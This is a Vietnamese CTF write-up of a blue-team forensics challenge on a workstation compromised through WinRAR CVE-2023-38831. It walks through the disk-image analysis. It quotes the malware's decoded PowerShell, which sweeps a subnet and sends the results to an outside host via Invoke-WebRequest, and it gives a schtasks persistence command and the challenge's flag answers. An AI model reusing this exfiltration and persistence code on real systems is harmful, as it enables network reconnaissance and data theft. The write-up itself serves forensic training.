# SpottedInTheWild - Week 3
----
**Scenario:** Bạn là thành viên của nhóm ứng phó sự cố tại FinTrust Bank. Sáng nay, hệ thống giám sát mạng đã gắn cờ các mẫu lưu lượng truy cập đi bất thường từ một số máy trạm. Phân tích sơ bộ của bộ phận CNTT đã xác định được một thỏa hiệp tiềm ẩn liên quan đến lỗ hổng bị khai thác trong phần mềm WinRAR.
Với tư cách là người ứng phó sự cố, nhiệm vụ của bạn là điều tra máy trạm bị xâm nhập này để hiểu phạm vi vi phạm, xác định phần mềm độc hại và theo dõi các hoạt động của nó trong mạng.

**Dữ liệu được cung cấp trong bài:**
* 1 file .rar chứa 1 file .vhd
* Pass giải nén: cyberdefenders.org

**Tool cần sử dụng trong bài:**
* Arsenal Image Mounter
* NTFS Log Tracker
* Vmware -> Windows 10 x64

**Link** -> [Cyberdefend](https://cyberdefenders.org/blueteam-ctf-challenges/spottedinthewild/)

----
# Câu hỏi

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/03bf61f8-ff91-418a-af07-b47afb7f3d78)

**Tạm dịch:**
1. Phần mềm nào dùng để download tệp tin chứa mã độc
2. UTC Timestamp Khi mà file chứa mã độc được download
3. Mã CVE của lỗi này
4. Tên file chứa mã độc
5. URL dùng để tải tiếp mã độc (được chạy bởi chương trình trên)
6. Tên script nào để tamper log của người dùng
7. UTC timestamp khi script chạy
8. Command kẻ tấn công sử dụng để duy trì quyền truy cập vào máy là gì.
9. Đường dẫn đầy đủ của tệp lưu trữ dữ liệu được thu thập bởi một trong các công cụ của kẻ tấn công để chuẩn bị cho việc lấy cắp dữ liệu là gì?

----
# Kiến thức cần tìm hiểu
**File .vhd**: là file **Virtual Hard Disk**, chứa image của 1 đĩa cứng ảo. Nó lưu trữ các nội dung của một disk trong VM, trong đó có thể bao gồm các phân vùng đĩa, một hệ thống tập tin, các file và thư mục. 

**UTC Timestamp**: Thời gian tính theo giờ UTC, UTC = GMT + 0. Tại Việt Nam là GMT + 7

**Tamper log:** Che dấu hành vi và giữ liên kết (maintain access). Có 2 loại log chủ yếu:
* Audit log: Log tạo bởi hệ điều hành
* Application log: log tạo bởi ứng dụng

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/d284cb12-524b-4703-bc6f-abe603ca0f1a)


----
# Câu 1
Trước tiên mình tiến hành giải nén, mount file **.vhd** bằng **Asernal Image Mounter**

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/dc25a2d4-b000-4db2-aa06-102d7777afcc)

Sau khi mount xong, mình tiên hành kiểm tra file

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/b1233979-b1d4-44e6-b77a-0dbc8ee36432)

Tại đây mình thấy mấy file này. Trước tiên do theo đầu bài đây là 1 lỗi nào đó về file **.rar** nên mình sẽ tìm kiếm xem có file nào như thế không.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/035ad0f9-b6dd-4731-a5b4-d8a70bf0c9b2)

Tại đây ta thấy có 1 file duy nhất là file **.rar**. Mình thử xem đường dẫn của nó.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/9b07a05a-bc28-484f-b46e-6352cd468104)

Tại đây mình thấy cái này được download về từ **Telegram** vì nó nằm trên thư mục **Telegram Desktop**. Để kiểm tra lại mình sẽ thử tìm kiếm

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/6450ed0c-526f-4ccd-8708-5a38a914d8bc)

Mình thử mở file log của telegram

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/e09a883f-599e-490d-8190-8975729583d1)

Và đồng thời kiểm tra so sánh giữa telegram của máy mình xem có điểm gì khác biệt không

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/48101b6d-a2dd-4e3f-83b9-51838da7196d)


Tạm thời không thấy file log và folder chứa Telegram có vấn đề, vị trí của file Telegram Desktop cũng trùng khớp với vị trí default của Telegram. Vậy là mình đã xác thực được đây không phải là làm giả folder. Mình thử nhập `telegram` vào ô điền flag.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/8027e127-33ed-4679-b9f4-c59f599b9fb3)

----
# Câu 2
Mình tiến hành kiểm tra **File properties** của file **SANS SEC401.rar**

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/1b94bd9e-3176-4e3a-9252-97d432fcdab3)

Ta thấy nó được tạo 03-02-2024 02:33:30. Tuy vậy nhưng Windows của mình đang nhận là giờ GMT + 7. Mình cẩn đổi nó về UTC và thời gian sẽ là `2024-02-03 07:33:20`. Mình thử nhập vào ô điền flag

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/bf5d2738-2c2a-48c6-841d-90938e0ae2da)

----
# Câu 3
Bằng 1 vài đường google cơ bản, ta có thể thấy luôn mã CVE ta cần tìm kiếm

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/5002df03-48d2-4d8e-9110-42ae96afd6b9)

Mình cũng kiểm tra các mã lỗi khác để phòng trường hợp nhầm do Winrar từ RARLAB có khá nhiều lỗi CVE [CVE Detail](https://www.cvedetails.com/vulnerability-list/vendor_id-1914/product_id-3768/Rarlab-Winrar.html)

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/790fba0e-c36e-4e5e-83de-76f702890df5)

Sau đó mình qua check lại nội dung của mã **CVE-2023-38831** nó liên quan tới cái gì

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/cc19c1ff-fa82-4cff-b207-892de804fae8)

Ta thấy dấu hiệu nhận biết là file và folder cùng tên. Mình sẽ quay lại và check file **.rar** nhận được từ CyberDefend.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/4fa30584-f52a-4c5e-b8dd-ef3b4f22ec87)

Tại đây ta có thể thấy có 1 file và 1 folder có tên y hệt nhau. Vậy là ta đã xác minh được đây có mã `CVE-2023-38831`. Mình thử nhập vào ô điền flag

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/dc5bc89d-70f1-4355-9fdb-611e9b3e64a2)

Có thể test thử PoC của CVE-2023-38831 [tại đây](https://github.com/HDCE-inc/CVE-2023-38831)

----
# Câu 4
Do đã xác định được lỗi CVE và theo như report đó, mã độc sẽ được chứa trong folder cùng tên với file. Mình sẽ mở thử file lên và xem có gì không

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/fba100d0-6e70-4337-a6be-a3f42651005e)

Ta thấy được file có tên `SANS SEC401.pdf .cmd`. Mình thử nhập vào ô tìm flag.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/8288a70c-89fd-4066-9fcf-957810b2245c)

----
# Câu 5
Dựa theo đọc đầu bài, file **SANS SEC401.pdf .cmd** sẽ chạy và download tiếp 1 file nữa. Trong **VM** mình sẽ chạy thử mã độc này.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/389e806d-4bc5-430b-ad9c-734f962f0c8e)

Ta có thể thấy file này đang cố download 1 file khác có tên `amanwhogetsnorest.jpg` và ở ngay trước đó có url là `http://172.18.35.10:8000/amanwhogetsnorest.jpg` để nó tải về. Mình thử nhập cái này vào điền flag 

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/4bc3f0f9-3a15-4fec-a1a0-85da1419eda9)

----
# Câu 6
Câu này có vẻ nó hỏi về Event log của Windows. Do là script mà có log, trên hệ thống windows thì chỉ có 3 loại file sẽ có thể có log lại là file **.cmd, .bat** và **ps1**. Mình thử dùng NTFS log tracker, add 2 file **$LogFile** và **$MFT** vào và tiến hành lọc các process.

Với file `.cmd`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/b0073ec7-ffe4-487b-a128-92663ab0516d)

Với file `.bat`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/1364aa72-8e7f-40e0-a6a1-20d17a2f9116)

Với file `.ps1`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/b7956c05-2efc-4cf6-b54d-5fb01386e10f)

Tại đây mình chú ý tới file `Eventlog.ps1` do file này bị xóa đi. Phân tích sâu hơn dựa theo suy đoán thì file này được tạo để xóa hết Event log liên quan tới Malware. Để xác minh cho suy đoán của mình thì mình thử kiểm tra file Log của applicationm và Powershell được lưu trong `C:\Windows\System32\winevt\logs`

Log Application

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/553c605d-3a25-4402-9e6a-6c1303fce895)

Log Powershell

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/a29baf02-410b-4ad5-bc02-1563d04c8a43)

Dựa theo thời gian chạy của file `SANS SEC401.pdf .cmd` ở trước đó khi ta lọc file `.cmd` thì ta có thể thấy thời gian nó chạy là trước khi file `Eventlog.ps1` chạy nhưng log của Windows lại không ghi lại. Các log về sau là sau thời file này bị xóa. Ta có thể kết luận đây là file cần tìm. Thử nhập flag

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/cd84caf8-7f95-406b-bfb2-284693f81864)

----
# Câu 7
Xem lại lịch sử của file `Eventlog.ps1` trong Event log, ta có được thời gian

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/3d23fed2-257c-499d-a1d5-c5c3055b2636)

Đổi qua giờ UTC, ta sẽ có flag là `2024-02-03 07:38:01`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/97062d59-b1af-456f-8df4-bd67aff07df9)

----
# Câu 8
Có vẻ câu này liên quan tới file `SANS SEC401.pdf .cmd`. Mình thử xem source file này

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/f025b829-cac4-4bbd-bfb2-fbcc0637110c)

Có vẻ như không thể đọc được source code của nó rồi. Mình thử tiến hành chạy lại file

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/f549e499-1d9d-47cb-81ba-2a8e4e9a6a33)

Mình khá chắc nó không chỉ tải 1 file jpg thông thường mà có thể extract ra cái gì đó khác. Mình thử bấm `Ctrl + c`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/cce2dcbd-cc29-4ac2-bf5a-180689298622)

Cái này là nó bảo mình terminate tức lập tức tắt. Mình thử chọn `N`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/c58f6263-92dc-4a08-9fbb-a27a1f4ff81c)

Tại đây mình chú ý tới command `schtask` mà terminal này vừa chạy. Command này là dùng để chạy sau mỗi phút vào ngày thứ 3 của mỗi tháng (tức có tính liên tục) với file run.bat. File này sẽ được chạy với hight priority. Mình thử nhập `schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST` vào ô điền flag

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/b59b4414-0d48-4346-b393-83a8dc6afc43)

----
# Câu 9
Mình chú ý tới file `run.bat` vì có vẻ như file này vẫn nằm trên hệ thống nên mình sẽ thử vào theo đường dẫn được tìm như ở câu 8

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/3f59b496-e012-44c5-8957-7ccda1e55d6b)

Tại đây mình thấy 2 file này. Mình cho chạy thử file `run.bat`

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/1d9f83c7-044b-460c-b5f4-7cf411548d6c)

Có vẻ như sau đó nó sẽ chạy file run.ps1. Mình mở file lên.

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/c0dd2f77-8e70-4012-b211-a217c36d4ea6)

Có vẻ đoạn code của nó được mã hóa rồi. Mình thử cho chạy xem có gì xảy ra không thì có vẻ như nó sẽ ping các host `192.168.1.x`. Tại đây mình thấy file `.ps1` này có đoạn dịch từ base64 -> code đọc được. Mình tạo 1 file khác, thêm lệnh Write-output cho biến `$LOAdCode` vì biến này sẽ biên dịch về ngôn ngữ đọc được

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/2c79d8cd-7a41-4249-ab9a-b7a423428634)

Mình thử chạy code

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/6402c7bb-2c6e-4f11-84bb-79e79069b272)

Dưới đây là đoạn sau khi biên dịch

````
$startIP = "192.168.1.1"
$endIP = "192.168.1.99"
$outputFile = "$env:UserProfile\AppData\Local\Temp\BL4356.txt"

$start = [System.Net.IPAddress]::Parse($startIP).GetAddressBytes()[3]
$end = [System.Net.IPAddress]::Parse($endIP).GetAddressBytes()[3]

for ($current = $start; $current -le $end; $current++) {
    $currentIP = "$($startIP.Substring(0, $startIP.LastIndexOf('.') + 1))$current"
    $result = Test-Connection -ComputerName $currentIP -Count 1 -ErrorAction SilentlyContinue

    if ($result -ne $null) {
        Write-Host "Host $currentIP is online."
        "Host $currentIP is online." | Out-File -Append -FilePath $outputFile
    } else {
        Write-Host "Host $currentIP is offline."
        "Host $currentIP is offline." | Out-File -Append -FilePath $outputFile
    }
}

Write-Host "Scan results saved to $outputFile"
$var = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($outputFile))
Invoke-WebRequest -Uri "http://192.168.1.5:8000/$var" -Method GET

````
Ta thấy có 1 biến là $outputFile được trả về `UserProfile\AppData\Local\Temp\BL4356.txt`. Mình thử tìm thử file này trên ổ đã mount

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/8f893dc6-3516-41cf-ad9d-c8c1d76eef42)

Có vẻ ta đã xác định được đường dẫn của nó là `C:\Users\Administrator\AppData\Local\Temp`. Thử nhập vào ô điền flag

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/e97dafb9-6db9-4b64-8a6e-0775806a0757)

----
# End of challenge check

![image](https://github.com/wdchocopie/CTF-learning/assets/81132394/01bddd26-6adb-4985-8ba9-e26c6084152d)

**--End--**
